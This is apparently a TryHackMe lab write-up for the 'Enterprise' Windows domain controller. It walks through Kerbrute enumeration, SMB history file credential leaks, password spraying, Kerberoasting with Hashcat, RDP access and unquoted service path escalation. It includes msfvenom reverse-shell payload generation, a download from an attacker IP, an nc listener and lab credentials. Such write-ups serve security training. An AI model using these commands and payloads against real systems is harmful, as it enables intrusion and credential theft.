# Enterprise - TryHackMe

> **Kill Chain Summary**: Enumerate Active Directory domain users via Kerbrute and inspect public SMB shares to uncover cleartext administrative credentials inside PowerShell PSReadLine history (`replication:101RepAdmin123!!`). Spray these credentials across the domain to authenticate as `enterprise`, while inspecting Atlassian Bitbucket repositories on port 7990 reveals developer credentials (`nik:ToastyBoi!`). Request a Kerberoastable TGS ticket for the service account `bitbucket` using Nik's credentials, crack the Kerberos hash offline (`bitbucket:littleredbucket`), and establish an RDP desktop session. Finally, identify an unquoted service path for `zerotieroneservice` with a writable intermediate directory, drop a custom service executable payload, and restart the service to execute commands as `NT AUTHORITY\SYSTEM`.

| Property | Value |
| --- | --- |
| **Target Name** | Enterprise |
| **Platform** | TryHackMe |
| **OS** | Windows (Active Directory) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Kerbrute User Enumeration, SMB Share Enumeration (PSReadLine History), Web App OSINT (Atlassian Bitbucket Commit History), Password Spraying, Kerberoasting (impacket-GetUserSPNs), RDP Access, Unquoted Service Path with Writable Directory |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A comprehensive TCP port scan was conducted across the target to enumerate all exposed services:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_$IP $IP
```

**Key Open Ports and Services:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **53/tcp** | DNS | Simple DNS Plus | Domain Controller |
| **80/tcp** | HTTP | Microsoft IIS httpd 10.0 | Default IIS splash page |
| **88/tcp** | Kerberos | Microsoft Windows Kerberos | Domain Controller |
| **135/tcp** | msrpc | Microsoft Windows RPC | Endpoint Mapper |
| **139/tcp** | netbios-ssn | Microsoft Windows netbios-ssn | NetBIOS session service |
| **389/tcp** | LDAP | Microsoft Windows Active Directory LDAP | Domain: `LAB.ENTERPRISE.THM` |
| **445/tcp** | microsoft-ds | Windows Server 2016 Standard 14393 | SMB (Signing required) |
| **3389/tcp** | ms-wbt-server | Microsoft Terminal Services | RDP (`LAB-DC.LAB.ENTERPRISE.THM`) |
| **5985/tcp** | wsman | Microsoft HTTPAPI httpd 2.0 | WinRM |
| **7990/tcp** | http | Atlassian Bitbucket | Source Code Management Portal |

The scan signatures confirm that the target host `LAB-DC` functions as the Primary Domain Controller for the `LAB.ENTERPRISE.THM` Active Directory domain (NetBIOS name: `LAB-ENTERPRISE`).

### Kerberos User Enumeration (Kerbrute)

Using `kerbrute` against the Kerberos KDC on port 88 with a comprehensive username wordlist, valid domain user accounts were systematically identified without triggering account lockout policies:

```bash
./kerbrute userenum -d LAB.ENTERPRISE.THM --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Identified Valid Domain Accounts:**
- `administrator`
- `guest`
- `banana`
- `cake`
- `enterprise`
- `nik`
- `spooks`
- `joiner`

### AS-REP Roasting Assessment

Before proceeding to password spraying or brute-forcing, an AS-REP Roasting check was performed against all enumerated domain accounts to identify any users configured without pre-authentication required (`DONT_REQ_PREAUTH`):

```bash
impacket-GetNPUsers LAB.ENTERPRISE.THM/ -usersfile users.txt -dc-ip $IP -no-pass
```

The scan returned no TGT data, indicating that all enumerated accounts require Kerberos pre-authentication.

---

## 2. Initial Access

Two independent credential discovery vectors were identified during deep service enumeration:

### Vector A: SMB Share Enumeration (PSReadLine History)

An anonymous SMB session was initiated to inspect available shares:

```bash
smbclient -L //$IP/ -N
```

The share `Users` allowed anonymous read access:

```bash
smbclient //$IP/Users -N
```

Navigating through the directory structure of the administrative profile `LAB-ADMIN`, the PowerShell console history file was discovered at:
`\LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt`

Downloading and inspecting the file revealed cleartext credentials:

```powershell
echo "replication:101RepAdmin123!!" > private.txt
```

#### Domain Password Spraying

The recovered password `101RepAdmin123!!` was sprayed across all enumerated domain users using CrackMapExec:

```bash
crackmapexec smb $IP -u users.txt -p '101RepAdmin123!!'
```

Output:
```text
[+] LAB.ENTERPRISE.THM\enterprise:101RepAdmin123!!
```

The credentials `enterprise:101RepAdmin123!!` proved valid across the domain.

---

### Vector B: Atlassian Bitbucket Git Commit History (Port 7990)

Port 7990 hosts an unauthenticated Atlassian Bitbucket web portal. Browsing the public repositories associated with user `nik` revealed development commit logs.

Inspecting prior Git commits showed that developer credentials had been hardcoded into configuration files and subsequently removed in later revisions:

```text
nik:ToastyBoi!
```

---

### Kerberoasting Attack

With valid domain credentials for `nik`, Kerberoasting was performed using Impacket's `GetUserSPNs` to query Active Directory for service accounts with registered Service Principal Names (SPNs):

```bash
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip $IP -request
```

A Kerberos TGS-REP ticket was retrieved for the service account `bitbucket`:

```text
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*...
```

#### Offline TGS Ticket Cracking

The extracted ticket was cracked using Hashcat mode 13100 (`Kerberos 5, etype 23, TGS-REP`) and the `rockyou.txt` dictionary:

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Resulting credentials:
```text
bitbucket:littleredbucket
```

### Remote Desktop (RDP) Access

While WinRM access on port 5985 was restricted, RDP authentication succeeded using the cracked `bitbucket` service account:

```bash
xfreerdp /v:$IP /u:bitbucket /p:littleredbucket +clipboard /dynamic-resolution
```

An interactive GUI desktop session was established on the Domain Controller.

---

## 3. Privilege Escalation

### Service Enumeration via PowerUp

Once connected via RDP, a PowerShell session was initiated and PowerUp was loaded to audit the local system configuration for privilege escalation vectors:

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

PowerUp identified an Unquoted Service Path vulnerability in the service `zerotieroneservice`:

- **Service Name**: `zerotieroneservice`
- **Path**: `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe`
- **Account**: `LocalSystem` (`NT AUTHORITY\SYSTEM`)
- **CanRestart**: `True`
- **Vulnerable Directory**: `C:\Program Files (x86)\Zero Tier` is writable by `BUILTIN\Users`.

### Unquoted Service Path Mechanism

When a Windows service binary path contains spaces and is not enclosed within quotation marks, the Windows Service Control Manager (`services.exe`) attempts to resolve the executable name by interpreting spaces as argument delimiters. The operating system attempts execution in the following order:

1. `C:\Program.exe`
2. `C:\Program Files (x86)\Zero.exe`
3. `C:\Program Files (x86)\Zero Tier\Zero.exe`
4. `C:\Program Files (x86)\Zero Tier\ZeroTier.exe` (or intermediate executable candidates matching path tokens)
5. `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe`

Because the directory `C:\Program Files (x86)\Zero Tier\` possesses write permissions for standard domain users, dropping a malicious executable named `ZeroTier.exe` into this directory intercepts service execution before reaching `Zero Tier One.exe`.

### Exploitation via Service Binary Injection

On the attack host, a standalone reverse shell executable tailored for Windows service execution (`-f exe-service`) was generated:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f exe-service -o ZeroTier.exe
```

A Python HTTP server was started on the attack host to serve the payload:

```bash
python3 -m http.server 9000
```

From the target PowerShell session, the payload was transferred directly into the writable intermediate directory:

```powershell
cd 'C:\Program Files (x86)\Zero Tier'
Invoke-WebRequest -Uri http://10.10.14.2:9000/ZeroTier.exe -OutFile ZeroTier.exe
```

A Netcat listener was established on Kali:

```bash
nc -lvnp 1234
```

The service was restarted using `sc.exe`:

```powershell
sc.exe stop zerotieroneservice
sc.exe start zerotieroneservice
```

The Service Control Manager executed `C:\Program Files (x86)\Zero Tier\ZeroTier.exe`, delivering a reverse shell with full system authority:

```cmd
C:\Windows\system32> whoami
nt authority\system
```

The root flag was retrieved:

```cmd
type C:\Users\Administrator\Desktop\root.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Domain User Enumeration via Kerbrute
./kerbrute userenum -d LAB.ENTERPRISE.THM --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# SMB Anonymous Share Enumeration
smbclient -L //$IP/ -N
smbclient //$IP/Users -N

# Domain Password Spraying with CrackMapExec
crackmapexec smb $IP -u users.txt -p '101RepAdmin123!!'

# Request Kerberoastable TGS Tickets
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip $IP -request

# Offline TGS Cracking with Hashcat
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# RDP Authentication via FreeRDP
xfreerdp /v:$IP /u:bitbucket /p:littleredbucket +clipboard /dynamic-resolution

# Windows Service Payload Generation
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe-service -o ZeroTier.exe

# Service Control Manipulation (Command Prompt / sc.exe)
sc.exe stop zerotieroneservice
sc.exe start zerotieroneservice
```

---

## 5. Key Takeaways and Lessons Learned

1. **Thorough Port and Service Discovery**:
   Non-standard HTTP ports (such as Atlassian Bitbucket on port 7990) must never be skipped. Fast scans may identify open ports, but deep service banner interrogation and browser inspection are mandatory to uncover web applications and source code repositories.

2. **Console and Shell History Analysis**:
   PowerShell PSReadLine history (`Consolehost_history.txt`) in Windows user directories frequently preserves sensitive administrative operations, including cleartext credentials, password resets, and deployment keys. When anonymous read access is granted to `C:\Users`, this file must be audited first.

3. **Git Commit History as an Intelligence Source**:
   Developers regularly commit credentials and then remove them in subsequent commits. Auditing full repository commit histories (`git log -p`) uncovers historical secrets that remain active across the environment.

4. **Service Binaries vs Standard Binaries in Windows**:
   When replacing or hijacking a Windows service executable, always generate payloads with `msfvenom -f exe-service`. Standard `-f exe` payloads fail to interact with the Windows Service Control Manager, triggering timeout errors and stopping service execution before a shell is spawned.

5. **PowerShell `sc` Alias Trap**:
   In PowerShell, `sc` is an alias for `Set-Content`. Always invoke `sc.exe` or execute service commands from `cmd.exe` to avoid silent execution failures.

---

#thm #windows #active-directory #kerbrute #smb #psreadline #password-spraying #bitbucket #git-history #kerberoasting #hashcat #rdp #powerup #unquoted-service-path #msfvenom #exe-service #medium
